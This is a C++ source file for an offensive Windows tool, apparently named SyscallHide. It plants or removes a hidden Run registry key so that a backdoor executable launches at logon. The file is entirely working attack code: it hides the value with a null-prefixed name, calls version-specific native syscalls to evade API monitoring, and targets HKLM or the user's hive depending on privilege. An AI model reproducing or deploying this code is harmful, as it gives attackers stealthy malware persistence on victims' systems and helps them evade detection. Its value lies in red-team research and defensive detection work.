#include <iostream>
#include <string>
#include <Lmcons.h>
#include <Shlobj.h>
#include <vector>

#include "SyscallHide.h"

#include <Sddl.h>

using std::vector;

//function which performs the check if the current process is running with elevated privileges
bool IsHighOrSystemIntegrity()
{
	wchar_t HighIntegrity[] = L"S-1-16-12288";
	wchar_t SystemIntegrity[] = L"S-1-16-16384";
	HANDLE hToken;

	// https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		wprintf(L"\t[!] Failed to get access token.\n");
		return FALSE;
	}

	DWORD dwSize = 0;
	if (!GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize)
		&& GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		wprintf(L"\t[!] Failed to query the byte size of TokenGroups.\n");
		CloseHandle(hToken);
		return FALSE;
	}

	// allocate memory for pTokenGroups
	PTOKEN_GROUPS pTokenGroups = (PTOKEN_GROUPS)GlobalAlloc(GPTR, dwSize);


	// https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-gettokeninformation
	if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwSize, &dwSize))
	{
		wprintf(L"[!] Failed to retrieve TokenGroups.\n");
		GlobalFree(pTokenGroups);
		CloseHandle(hToken);
		return FALSE;
	}

	for (DWORD i = 0; i < pTokenGroups->GroupCount; ++i)
	{

		wchar_t* pStringSid = NULL;

		// https://docs.microsoft.com/en-us/windows/desktop/api/sddl/nf-sddl-convertsidtostringsida
		if (!ConvertSidToStringSid(pTokenGroups->Groups[i].Sid, &pStringSid))
		{
			wprintf(L"[!] Failed to convert to string SID.\n");
			continue;
		}
		else
		{
			//check if Sid is the high integrity Sid S-1-16-12288 or the system one S-1-16-16384
			if (!wcscmp(pStringSid, HighIntegrity) || !wcscmp(pStringSid, SystemIntegrity))
			{
				//wprintf(L"\t [>] Sid is %ls.\n", pStringSid);
				return TRUE;
			}
			else
			{
				continue;
			}
			LocalFree(pStringSid);
		}
	}

	GlobalFree(pTokenGroups);
	CloseHandle(hToken);

	return FALSE;
}

//function which retrieves both the current username and the SID
LPWSTR GetSID()
{
	wchar_t lpBuffer[UNLEN];
	DWORD pcbBuffer = UNLEN;
	GetUserName(lpBuffer, &pcbBuffer);
	//wprintf(L"\t [>] Username is: %s\n", lpBuffer);

	SID sid;
	DWORD cbSid = SECURITY_MAX_SID_SIZE;
	SID_NAME_USE peUse = SidTypeUser;

	DWORD cchReferencedDomainName = 0;
	LookupAccountNameW(NULL, lpBuffer, &sid, &cbSid, NULL, &cchReferencedDomainName, &peUse);
	LPWSTR referencedDomainName = (LPWSTR)malloc(cchReferencedDomainName * sizeof(*referencedDomainName));
	LookupAccountNameW(NULL, lpBuffer, &sid, &cbSid, referencedDomainName, &cchReferencedDomainName, &peUse);

	LPWSTR SID;
	ConvertSidToStringSidW(&sid, &SID);
	//wprintf(L"\t [>] User's SID is: %ls\n", SID);
	return SID;
}

void Usage()
{
	wprintf(L"\n\r [>] Create hidden registry (Run) key:\n\r SyscallHide.exe create C:\\Windows\\Temp\\backdoor.exe\n\n");
	wprintf(L"\r [>] Create hidden registry (Run) key with parameters:\n\r SyscallHide.exe create C:\\Windows\\Temp\\backdoor.exe arg1 arg2\n\n");
	wprintf(L"\r [>] Delete hidden registry (Run) key:\n\r SyscallHide.exe delete\n");
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc <= 1)
	{
		Usage();
		return 0;
	}

	// if the first argument is not create or delete then exit
	if (wcscmp(argv[1], L"create") && wcscmp(argv[1], L"delete"))
	{
		Usage();
		return 0;
	}

	//delete accepts only one argument
	if (!wcscmp(argv[1], L"delete") && argc > 2)
	{
		Usage();
		return 0;
	}

	//check if we have parameters for the registry key value
	vector <LPWSTR> arguments;
	if (!wcscmp(argv[1], L"create") && argc > 3)
	{
		for (int i = 3; i < argc; i++)
		{
			arguments.push_back(argv[i]);
		}
	}

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	WCHAR releaseVersion[8];
	LPCWSTR OSVersion;
	LPCWSTR	runKeyPathTrick = L"\0\0SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";


	//retrieve windows OS version
	MyRtlGetVersion RtlGetVersion;
	RtlGetVersion = (MyRtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
	OSVERSIONINFOEXW osInfo;

	if (NULL != RtlGetVersion)
	{
		osInfo.dwOSVersionInfoSize = sizeof(osInfo);
		RtlGetVersion(&osInfo);
	}
	else
		return FALSE;

	wprintf(L"[>] Checking OS version details:\n");
	swprintf_s(releaseVersion, _countof(releaseVersion), L"%lu.%lu", osInfo.dwMajorVersion, osInfo.dwMinorVersion);

	//Create os/build specific syscall function pointers
	if (_wcsicmp(releaseVersion, L"10.0") == 0) {
		OSVersion = L"10 or Server 2016";
		wprintf(L"\t [>] Operating System is Windows %ls, build number %d.\n", OSVersion, osInfo.dwBuildNumber);
		wprintf(L"\t [>] Mapping version specific system calls.\n");
		ZwOpenKey = &ZwOpenKey10;
		NtSetValueKey = &NtSetValueKey10;
		NtDeleteValueKey = &NtDeleteValueKey10;
		NtClose = &NtClose10;
	}
	else if (_wcsicmp(releaseVersion, L"6.1") == 0) {
		OSVersion = L"7 SP1 or Server 2008 R2";
		wprintf(L"\t [>] Operating System is Windows %ls, build number %d.\n", OSVersion, osInfo.dwBuildNumber);
		wprintf(L"\t [>] Mapping version specific system calls.\n");
		ZwOpenKey = &ZwOpenKey7SP1;
		NtSetValueKey = &NtSetValueKey7SP1;
		NtDeleteValueKey = &NtDeleteValueKey7SP1;
		NtClose = &NtClose7SP1;
	}
	else {
		wprintf(L" OS Version not supported.\n");
		exit(1);
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	UNICODE_STRING runKeyPath;

	//define SID in case the current process is not running with elevated privileges and therefore we need to reference to HKCU with user's SID
	LPWSTR SID;

	//check is current process is running with elevated privileges; if so we will edit the HKLM registry key
	if (IsHighOrSystemIntegrity()) {
		wprintf(L"\t [>] SyscallHide is running as elevated user.\n");
		RtlInitUnicodeString(&runKeyPath, L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	}
	else {
		wprintf(L"\t [>] SyscallHide is not running as elevated user.\n");
		SID = GetSID();
		//wprintf(L"\t [>] User's SID is: %ls\n", SID);
		wchar_t wcs[256];
		wcscpy_s(wcs, L"\\Registry\\User\\");
		wcscat_s(wcs, SID);
		wcscat_s(wcs, L"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
		//wprintf(L"\t [>] Registry path is: %s\n", wcs);
		RtlInitUnicodeString(&runKeyPath, wcs);
	}

	OBJECT_ATTRIBUTES objectAttributes;
	InitializeObjectAttributes(&objectAttributes, &runKeyPath, 0x00000040L, NULL, NULL);
	HANDLE keyHandle = NULL;

	ZwOpenKey(&keyHandle, KEY_WRITE, &objectAttributes);

	UNICODE_STRING valueName;
	valueName.Buffer = runKeyPathTrick;
	valueName.MaximumLength = 0;
	valueName.Length = 2 * sizeof(runKeyPathTrick);

	if (!wcscmp(argv[1], L"delete")) {
		wprintf(L"\t [>] Try to delete the registry key.\n");
		NtDeleteValueKey(keyHandle, &valueName);
		wprintf(L"\t [>] Done.\n");
	}
	else {
		UNICODE_STRING valueData;
		wchar_t args[1024];
		if (argc > 3)
		{
			wcscpy_s(args, argv[2]);
			wcscat_s(args, L" ");
			for (int i = 0; i < arguments.size(); i++)
			{
				wcscat_s(args, arguments[i]);
				wcscat_s(args, L" ");
			}
			valueData.Buffer = args;
		}
		else
		{
			valueData.Buffer = argv[2];
		}
		valueData.MaximumLength = 0;

		NtSetValueKey(keyHandle, &valueName, 0, 1, (PVOID)valueData.Buffer, wcslen(valueData.Buffer) * 2);
	}
	NtClose(keyHandle);
}